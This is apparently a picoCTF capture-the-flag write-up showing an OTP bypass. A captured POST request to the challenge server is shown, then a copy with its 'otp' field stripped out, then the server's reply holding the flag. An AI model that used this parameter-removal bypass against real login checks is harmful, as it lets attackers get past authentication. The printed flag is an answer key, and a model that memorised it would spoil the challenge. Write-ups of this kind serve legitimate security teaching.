# Solution

- Open `BurpSuite` and Intercept the request of `OTP`
#### Request

```bash
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:51597
Content-Length: 8
Cache-Control: max-age=0
Origin: http://titan.picoctf.net:51597
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.9
Referer: http://titan.picoctf.net:51597/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJxNjtEKAiEQRf_F5x50dWrrZ2TUGYp2VZyViOjfcwmix3PgHu5Lxdv2VBclmNRBRWnst3KnPFSIeMZkDVkHR3TozKwh2YnncDKATMwBSO877sviM670LeFQZasDLGiY3MCKIo_S0nAoSfZRvZZMPvc1UPs96ELtP_T-AOC4Mpo.Z87PvA.iDLEQZXxWreA-Mmndrk_vXnMR7I
Connection: keep-alive

otp=8080
```

#### Modified Request

```bash
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:51597
Content-Length: 8
Cache-Control: max-age=0
Origin: http://titan.picoctf.net:51597
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.9
Referer: http://titan.picoctf.net:51597/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJxNjtEKAiEQRf_F5x50dWrrZ2TUGYp2VZyViOjfcwmix3PgHu5Lxdv2VBclmNRBRWnst3KnPFSIeMZkDVkHR3TozKwh2YnncDKATMwBSO877sviM670LeFQZasDLGiY3MCKIo_S0nAoSfZRvZZMPvc1UPs96ELtP_T-AOC4Mpo.Z87PvA.iDLEQZXxWreA-Mmndrk_vXnMR7I
Connection: keep-alive
```

#### Response

```bash
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Mon, 10 Mar 2025 11:45:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 105
Vary: Cookie
Connection: close

Welcome, sada you sucessfully bypassed the OTP request. 
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_e1eb16ed}
```

---
